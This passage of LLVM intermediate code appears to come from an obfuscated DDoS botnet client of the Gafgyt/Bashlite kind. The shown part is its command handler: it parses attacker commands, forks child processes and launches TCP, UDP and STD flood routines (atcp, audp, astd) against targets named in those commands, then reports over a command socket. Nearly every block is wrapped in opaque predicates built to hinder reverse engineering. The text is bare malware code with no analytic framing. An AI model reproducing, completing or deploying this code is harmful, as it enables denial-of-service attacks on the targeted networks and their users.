  br i1 %567, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %559, label %593, label %568

; <label>:568:                                    ; preds = %originalBBpart272, %543
  %569 = load i32, i32* %11, align 4
  %570 = icmp eq i32 %569, 8
  br i1 %570, label %571, label %594

; <label>:571:                                    ; preds = %568
  %572 = load i32, i32* @x.53
  %573 = load i32, i32* @y.54
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %571
  %580 = load i8**, i8*** %12, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 7
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @atoi(i8* %582) #10
  %584 = icmp slt i32 %583, 1
  %585 = load i32, i32* @x.53
  %586 = load i32, i32* @y.54
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %584, label %593, label %594

; <label>:593:                                    ; preds = %originalBBpart276, %originalBBpart272, %originalBBpart268, %originalBBpart264, %493, %originalBBpart260, %468
  br label %1421

; <label>:594:                                    ; preds = %originalBBpart276, %568
  %595 = load i8**, i8*** %12, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 1
  %597 = load i8*, i8** %596, align 8
  store i8* %597, i8** %24, align 8
  %598 = load i8**, i8*** %12, align 8
  %599 = getelementptr inbounds i8*, i8** %598, i64 2
  %600 = load i8*, i8** %599, align 8
  %601 = call i32 @atoi(i8* %600) #10
  store i32 %601, i32* %25, align 4
  %602 = load i8**, i8*** %12, align 8
  %603 = getelementptr inbounds i8*, i8** %602, i64 3
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @atoi(i8* %604) #10
  store i32 %605, i32* %26, align 4
  %606 = load i8**, i8*** %12, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 4
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  store i32 %609, i32* %27, align 4
  %610 = load i8**, i8*** %12, align 8
  %611 = getelementptr inbounds i8*, i8** %610, i64 5
  %612 = load i8*, i8** %611, align 8
  store i8* %612, i8** %28, align 8
  %613 = load i32, i32* %11, align 4
  %614 = icmp eq i32 %613, 8
  br i1 %614, label %615, label %620

; <label>:615:                                    ; preds = %594
  %616 = load i8**, i8*** %12, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 7
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @atoi(i8* %618) #10
  br label %637

; <label>:620:                                    ; preds = %594
  %621 = load i32, i32* @x.53
  %622 = load i32, i32* @y.54
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %620
  %629 = load i32, i32* @x.53
  %630 = load i32, i32* @y.54
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %637

; <label>:637:                                    ; preds = %originalBBpart280, %615
  %638 = phi i32 [ %619, %615 ], [ 10, %originalBBpart280 ]
  %639 = load i32, i32* @x.53
  %640 = load i32, i32* @y.54
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %637
  store i32 %638, i32* %29, align 4
  %647 = load i32, i32* %11, align 4
  %648 = icmp sgt i32 %647, 6
  %649 = load i32, i32* @x.53
  %650 = load i32, i32* @y.54
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %648, label %657, label %662

; <label>:657:                                    ; preds = %originalBBpart284
  %658 = load i8**, i8*** %12, align 8
  %659 = getelementptr inbounds i8*, i8** %658, i64 6
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 @atoi(i8* %660) #10
  br label %663

; <label>:662:                                    ; preds = %originalBBpart284
  br label %663

; <label>:663:                                    ; preds = %662, %657
  %664 = phi i32 [ %661, %657 ], [ 0, %662 ]
  store i32 %664, i32* %30, align 4
  %665 = load i8*, i8** %24, align 8
  %666 = call i8* @strstr(i8* %665, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %667 = icmp ne i8* %666, null
  br i1 %667, label %668, label %738

; <label>:668:                                    ; preds = %663
  %669 = load i32, i32* @x.53
  %670 = load i32, i32* @y.54
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %668
  %677 = load i8*, i8** %24, align 8
  %678 = call i8* @strtok(i8* %677, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %678, i8** %31, align 8
  %679 = load i32, i32* @x.53
  %680 = load i32, i32* @y.54
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %687

; <label>:687:                                    ; preds = %originalBBpart296, %originalBBpart288
  %688 = load i32, i32* @x.53
  %689 = load i32, i32* @y.54
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %687
  %696 = load i8*, i8** %31, align 8
  %697 = icmp ne i8* %696, null
  %698 = load i32, i32* @x.53
  %699 = load i32, i32* @y.54
  %700 = sub i32 %698, 1
  %701 = mul i32 %698, %700
  %702 = urem i32 %701, 2
  %703 = icmp eq i32 %702, 0
  %704 = icmp slt i32 %699, 10
  %705 = or i1 %703, %704
  br i1 %705, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %697, label %706, label %737

; <label>:706:                                    ; preds = %originalBBpart292
  %707 = call i32 @listFork()
  %708 = icmp ne i32 %707, 0
  br i1 %708, label %719, label %709

; <label>:709:                                    ; preds = %706
  %710 = load i8*, i8** %31, align 8
  %711 = load i32, i32* %25, align 4
  %712 = load i32, i32* %26, align 4
  %713 = load i32, i32* %27, align 4
  %714 = load i8*, i8** %28, align 8
  %715 = load i32, i32* %30, align 4
  %716 = load i32, i32* %29, align 4
  call void @atcp(i8* %710, i32 %711, i32 %712, i32 %713, i8* %714, i32 %715, i32 %716)
  %717 = load i32, i32* @mainCommSock, align 4
  %718 = call i32 @close(i32 %717)
  call void @_exit(i32 0) #11
  unreachable

; <label>:719:                                    ; preds = %706
  %720 = load i32, i32* @x.53
  %721 = load i32, i32* @y.54
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %719
  %728 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %728, i8** %31, align 8
  %729 = load i32, i32* @x.53
  %730 = load i32, i32* @y.54
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %687

; <label>:737:                                    ; preds = %originalBBpart292
  br label %765

; <label>:738:                                    ; preds = %663
  %739 = call i32 @listFork()
  %740 = icmp ne i32 %739, 0
  br i1 %740, label %741, label %742

; <label>:741:                                    ; preds = %738
  br label %1421

; <label>:742:                                    ; preds = %738
  %743 = load i32, i32* @mainCommSock, align 4
  %744 = load i8**, i8*** %12, align 8
  %745 = getelementptr inbounds i8*, i8** %744, i64 1
  %746 = load i8*, i8** %745, align 8
  %747 = load i8**, i8*** %12, align 8
  %748 = getelementptr inbounds i8*, i8** %747, i64 2
  %749 = load i8*, i8** %748, align 8
  %750 = call i32 @atoi(i8* %749) #10
  %751 = load i8**, i8*** %12, align 8
  %752 = getelementptr inbounds i8*, i8** %751, i64 3
  %753 = load i8*, i8** %752, align 8
  %754 = call i32 @atoi(i8* %753) #10
  %755 = call i32 (i32, i8*, ...) @sockprintf(i32 %743, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.34, i32 0, i32 0), i8* %746, i32 %750, i32 %754)
  %756 = load i8*, i8** %24, align 8
  %757 = load i32, i32* %25, align 4
  %758 = load i32, i32* %26, align 4
  %759 = load i32, i32* %27, align 4
  %760 = load i8*, i8** %28, align 8
  %761 = load i32, i32* %30, align 4
  %762 = load i32, i32* %29, align 4
  call void @atcp(i8* %756, i32 %757, i32 %758, i32 %759, i8* %760, i32 %761, i32 %762)
  %763 = load i32, i32* @mainCommSock, align 4
  %764 = call i32 @close(i32 %763)
  call void @_exit(i32 0) #11
  unreachable

; <label>:765:                                    ; preds = %737
  br label %766

; <label>:766:                                    ; preds = %765, %originalBBpart256
  %767 = load i32, i32* @x.53
  %768 = load i32, i32* @y.54
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %766
  %775 = load i8**, i8*** %12, align 8
  %776 = getelementptr inbounds i8*, i8** %775, i64 0
  %777 = load i8*, i8** %776, align 8
  %778 = call i32 @strcmp(i8* %777, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %779 = icmp ne i32 %778, 0
  %780 = load i32, i32* @x.53
  %781 = load i32, i32* @y.54
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %779, label %1107, label %788

; <label>:788:                                    ; preds = %originalBBpart2100
  %789 = load i32, i32* @x.53
  %790 = load i32, i32* @y.54
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %788
  %797 = load i32, i32* %11, align 4
  %798 = icmp slt i32 %797, 6
  %799 = load i32, i32* @x.53
  %800 = load i32, i32* @y.54
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %798, label %913, label %807

; <label>:807:                                    ; preds = %originalBBpart2104
  %808 = load i32, i32* @x.53
  %809 = load i32, i32* @y.54
  %810 = sub i32 %808, 1
  %811 = mul i32 %808, %810
  %812 = urem i32 %811, 2
  %813 = icmp eq i32 %812, 0
  %814 = icmp slt i32 %809, 10
  %815 = or i1 %813, %814
  br i1 %815, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %807
  %816 = load i8**, i8*** %12, align 8
  %817 = getelementptr inbounds i8*, i8** %816, i64 3
  %818 = load i8*, i8** %817, align 8
  %819 = call i32 @atoi(i8* %818) #10
  %820 = icmp eq i32 %819, -1
  %821 = load i32, i32* @x.53
  %822 = load i32, i32* @y.54
  %823 = sub i32 %821, 1
  %824 = mul i32 %821, %823
  %825 = urem i32 %824, 2
  %826 = icmp eq i32 %825, 0
  %827 = icmp slt i32 %822, 10
  %828 = or i1 %826, %827
  br i1 %828, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %820, label %913, label %829

; <label>:829:                                    ; preds = %originalBBpart2108
  %830 = load i32, i32* @x.53
  %831 = load i32, i32* @y.54
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %829
  %838 = load i8**, i8*** %12, align 8
  %839 = getelementptr inbounds i8*, i8** %838, i64 2
  %840 = load i8*, i8** %839, align 8
  %841 = call i32 @atoi(i8* %840) #10
  %842 = icmp eq i32 %841, -1
  %843 = load i32, i32* @x.53
  %844 = load i32, i32* @y.54
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %842, label %913, label %851

; <label>:851:                                    ; preds = %originalBBpart2112
  %852 = load i8**, i8*** %12, align 8
  %853 = getelementptr inbounds i8*, i8** %852, i64 4
  %854 = load i8*, i8** %853, align 8
  %855 = call i32 @atoi(i8* %854) #10
  %856 = icmp eq i32 %855, -1
  br i1 %856, label %913, label %857

; <label>:857:                                    ; preds = %851
  %858 = load i32, i32* @x.53
  %859 = load i32, i32* @y.54
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %857
  %866 = load i8**, i8*** %12, align 8
  %867 = getelementptr inbounds i8*, i8** %866, i64 4
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 @atoi(i8* %868) #10
  %870 = icmp sgt i32 %869, 32
  %871 = load i32, i32* @x.53
  %872 = load i32, i32* @y.54
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %870, label %913, label %879

; <label>:879:                                    ; preds = %originalBBpart2116
  %880 = load i32, i32* %11, align 4
  %881 = icmp sgt i32 %880, 6
  br i1 %881, label %882, label %888

; <label>:882:                                    ; preds = %879
  %883 = load i8**, i8*** %12, align 8
  %884 = getelementptr inbounds i8*, i8** %883, i64 6
  %885 = load i8*, i8** %884, align 8
  %886 = call i32 @atoi(i8* %885) #10
  %887 = icmp slt i32 %886, 0
  br i1 %887, label %913, label %888

; <label>:888:                                    ; preds = %882, %879
  %889 = load i32, i32* %11, align 4
  %890 = icmp eq i32 %889, 8
  br i1 %890, label %891, label %914

; <label>:891:                                    ; preds = %888
  %892 = load i32, i32* @x.53
  %893 = load i32, i32* @y.54
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %891
  %900 = load i8**, i8*** %12, align 8
  %901 = getelementptr inbounds i8*, i8** %900, i64 7
  %902 = load i8*, i8** %901, align 8
  %903 = call i32 @atoi(i8* %902) #10
  %904 = icmp slt i32 %903, 1
  %905 = load i32, i32* @x.53
  %906 = load i32, i32* @y.54
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %904, label %913, label %914

; <label>:913:                                    ; preds = %originalBBpart2120, %882, %originalBBpart2116, %851, %originalBBpart2112, %originalBBpart2108, %originalBBpart2104
  br label %1421

; <label>:914:                                    ; preds = %originalBBpart2120, %888
  %915 = load i8**, i8*** %12, align 8
  %916 = getelementptr inbounds i8*, i8** %915, i64 1
  %917 = load i8*, i8** %916, align 8
  store i8* %917, i8** %32, align 8
  %918 = load i8**, i8*** %12, align 8
  %919 = getelementptr inbounds i8*, i8** %918, i64 2
  %920 = load i8*, i8** %919, align 8
  %921 = call i32 @atoi(i8* %920) #10
  store i32 %921, i32* %33, align 4
  %922 = load i8**, i8*** %12, align 8
  %923 = getelementptr inbounds i8*, i8** %922, i64 3
  %924 = load i8*, i8** %923, align 8
  %925 = call i32 @atoi(i8* %924) #10
  store i32 %925, i32* %34, align 4
  %926 = load i8**, i8*** %12, align 8
  %927 = getelementptr inbounds i8*, i8** %926, i64 4
  %928 = load i8*, i8** %927, align 8
  %929 = call i32 @atoi(i8* %928) #10
  store i32 %929, i32* %35, align 4
  %930 = load i8**, i8*** %12, align 8
  %931 = getelementptr inbounds i8*, i8** %930, i64 5
  %932 = load i8*, i8** %931, align 8
  store i8* %932, i8** %36, align 8
  %933 = load i32, i32* %11, align 4
  %934 = icmp eq i32 %933, 8
  br i1 %934, label %935, label %940

; <label>:935:                                    ; preds = %914
  %936 = load i8**, i8*** %12, align 8
  %937 = getelementptr inbounds i8*, i8** %936, i64 7
  %938 = load i8*, i8** %937, align 8
  %939 = call i32 @atoi(i8* %938) #10
  br label %941

; <label>:940:                                    ; preds = %914
  br label %941

; <label>:941:                                    ; preds = %940, %935
  %942 = phi i32 [ %939, %935 ], [ 10, %940 ]
  store i32 %942, i32* %37, align 4
  %943 = load i32, i32* %11, align 4
  %944 = icmp sgt i32 %943, 6
  br i1 %944, label %945, label %966

; <label>:945:                                    ; preds = %941
  %946 = load i32, i32* @x.53
  %947 = load i32, i32* @y.54
  %948 = sub i32 %946, 1
  %949 = mul i32 %946, %948
  %950 = urem i32 %949, 2
  %951 = icmp eq i32 %950, 0
  %952 = icmp slt i32 %947, 10
  %953 = or i1 %951, %952
  br i1 %953, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %945
  %954 = load i8**, i8*** %12, align 8
  %955 = getelementptr inbounds i8*, i8** %954, i64 6
  %956 = load i8*, i8** %955, align 8
  %957 = call i32 @atoi(i8* %956) #10
  %958 = load i32, i32* @x.53
  %959 = load i32, i32* @y.54
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %967

; <label>:966:                                    ; preds = %941
  br label %967

; <label>:967:                                    ; preds = %966, %originalBBpart2124
  %968 = phi i32 [ %957, %originalBBpart2124 ], [ 0, %966 ]
  %969 = load i32, i32* @x.53
  %970 = load i32, i32* @y.54
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %967
  store i32 %968, i32* %38, align 4
  %977 = load i8*, i8** %32, align 8
  %978 = call i8* @strstr(i8* %977, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %979 = icmp ne i8* %978, null
  %980 = load i32, i32* @x.53
  %981 = load i32, i32* @y.54
  %982 = sub i32 %980, 1
  %983 = mul i32 %980, %982
  %984 = urem i32 %983, 2
  %985 = icmp eq i32 %984, 0
  %986 = icmp slt i32 %981, 10
  %987 = or i1 %985, %986
  br i1 %987, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %979, label %988, label %1051

; <label>:988:                                    ; preds = %originalBBpart2128
  %989 = load i32, i32* @x.53
  %990 = load i32, i32* @y.54
  %991 = sub i32 %989, 1
  %992 = mul i32 %989, %991
  %993 = urem i32 %992, 2
  %994 = icmp eq i32 %993, 0
  %995 = icmp slt i32 %990, 10
  %996 = or i1 %994, %995
  br i1 %996, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %988
  %997 = load i8*, i8** %32, align 8
  %998 = call i8* @strtok(i8* %997, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %998, i8** %39, align 8
  %999 = load i32, i32* @x.53
  %1000 = load i32, i32* @y.54
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1007

; <label>:1007:                                   ; preds = %originalBBpart2136, %originalBBpart2132
  %1008 = load i8*, i8** %39, align 8
  %1009 = icmp ne i8* %1008, null
  br i1 %1009, label %1010, label %1050

; <label>:1010:                                   ; preds = %1007
  %1011 = call i32 @listFork()
  %1012 = icmp ne i32 %1011, 0
  br i1 %1012, label %1032, label %1013

; <label>:1013:                                   ; preds = %1010
  %1014 = load i8*, i8** %32, align 8
  %1015 = load i32, i32* %33, align 4
  %1016 = load i32, i32* %34, align 4
  call void @astd(i8* %1014, i32 %1015, i32 %1016)
  %1017 = load i8*, i8** %32, align 8
  %1018 = load i32, i32* %33, align 4
  %1019 = load i32, i32* %34, align 4
  %1020 = load i32, i32* %35, align 4
  %1021 = load i32, i32* %38, align 4
  %1022 = load i32, i32* %37, align 4
  call void @audp(i8* %1017, i32 %1018, i32 %1019, i32 %1020, i32 %1021, i32 %1022)
  %1023 = load i8*, i8** %32, align 8
  %1024 = load i32, i32* %33, align 4
  %1025 = load i32, i32* %34, align 4
  %1026 = load i32, i32* %35, align 4
  %1027 = load i8*, i8** %36, align 8
  %1028 = load i32, i32* %38, align 4
  %1029 = load i32, i32* %37, align 4
  call void @atcp(i8* %1023, i32 %1024, i32 %1025, i32 %1026, i8* %1027, i32 %1028, i32 %1029)
  %1030 = load i32, i32* @mainCommSock, align 4
  %1031 = call i32 @close(i32 %1030)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1032:                                   ; preds = %1010
  %1033 = load i32, i32* @x.53
  %1034 = load i32, i32* @y.54
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1032
  %1041 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1041, i8** %39, align 8
  %1042 = load i32, i32* @x.53
  %1043 = load i32, i32* @y.54
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1007

; <label>:1050:                                   ; preds = %1007
  br label %1106

; <label>:1051:                                   ; preds = %originalBBpart2128
  %1052 = call i32 @listFork()
  %1053 = icmp ne i32 %1052, 0
  br i1 %1053, label %1054, label %1071

; <label>:1054:                                   ; preds = %1051
  %1055 = load i32, i32* @x.53
  %1056 = load i32, i32* @y.54
  %1057 = sub i32 %1055, 1
  %1058 = mul i32 %1055, %1057
  %1059 = urem i32 %1058, 2
  %1060 = icmp eq i32 %1059, 0
  %1061 = icmp slt i32 %1056, 10
  %1062 = or i1 %1060, %1061
  br i1 %1062, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1054
  %1063 = load i32, i32* @x.53
  %1064 = load i32, i32* @y.54
  %1065 = sub i32 %1063, 1
  %1066 = mul i32 %1063, %1065
  %1067 = urem i32 %1066, 2
  %1068 = icmp eq i32 %1067, 0
  %1069 = icmp slt i32 %1064, 10
  %1070 = or i1 %1068, %1069
  br i1 %1070, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1421

; <label>:1071:                                   ; preds = %1051
  %1072 = load i32, i32* @x.53
  %1073 = load i32, i32* @y.54
  %1074 = sub i32 %1072, 1
  %1075 = mul i32 %1072, %1074
  %1076 = urem i32 %1075, 2
  %1077 = icmp eq i32 %1076, 0
  %1078 = icmp slt i32 %1073, 10
  %1079 = or i1 %1077, %1078
  br i1 %1079, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1071
  %1080 = load i8*, i8** %32, align 8
  %1081 = load i32, i32* %33, align 4
  %1082 = load i32, i32* %34, align 4
  call void @astd(i8* %1080, i32 %1081, i32 %1082)
  %1083 = load i8*, i8** %32, align 8
  %1084 = load i32, i32* %33, align 4
  %1085 = load i32, i32* %34, align 4
  %1086 = load i32, i32* %35, align 4
  %1087 = load i32, i32* %38, align 4
  %1088 = load i32, i32* %37, align 4
  call void @audp(i8* %1083, i32 %1084, i32 %1085, i32 %1086, i32 %1087, i32 %1088)
  %1089 = load i8*, i8** %32, align 8
  %1090 = load i32, i32* %33, align 4
  %1091 = load i32, i32* %34, align 4
  %1092 = load i32, i32* %35, align 4
  %1093 = load i8*, i8** %36, align 8
  %1094 = load i32, i32* %38, align 4
  %1095 = load i32, i32* %37, align 4
  call void @atcp(i8* %1089, i32 %1090, i32 %1091, i32 %1092, i8* %1093, i32 %1094, i32 %1095)
  %1096 = load i32, i32* @mainCommSock, align 4
  %1097 = call i32 @close(i32 %1096)
  call void @_exit(i32 0) #11
  %1098 = load i32, i32* @x.53
  %1099 = load i32, i32* @y.54
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  unreachable

; <label>:1106:                                   ; preds = %1050
  br label %1107

; <label>:1107:                                   ; preds = %1106, %originalBBpart2100
  %1108 = load i8**, i8*** %12, align 8
  %1109 = getelementptr inbounds i8*, i8** %1108, i64 0
  %1110 = load i8*, i8** %1109, align 8
  %1111 = call i32 @strcmp(i8* %1110, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i32 0, i32 0)) #10
  %1112 = icmp ne i32 %1111, 0
  br i1 %1112, label %1283, label %1113

; <label>:1113:                                   ; preds = %1107
  %1114 = load i32, i32* %11, align 4
  %1115 = icmp slt i32 %1114, 4
  br i1 %1115, label %1144, label %1116

; <label>:1116:                                   ; preds = %1113
  %1117 = load i32, i32* @x.53
  %1118 = load i32, i32* @y.54
  %1119 = sub i32 %1117, 1
  %1120 = mul i32 %1117, %1119
  %1121 = urem i32 %1120, 2
  %1122 = icmp eq i32 %1121, 0
  %1123 = icmp slt i32 %1118, 10
  %1124 = or i1 %1122, %1123
  br i1 %1124, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1116
  %1125 = load i8**, i8*** %12, align 8
  %1126 = getelementptr inbounds i8*, i8** %1125, i64 2
  %1127 = load i8*, i8** %1126, align 8
  %1128 = call i32 @atoi(i8* %1127) #10
  %1129 = icmp slt i32 %1128, 1
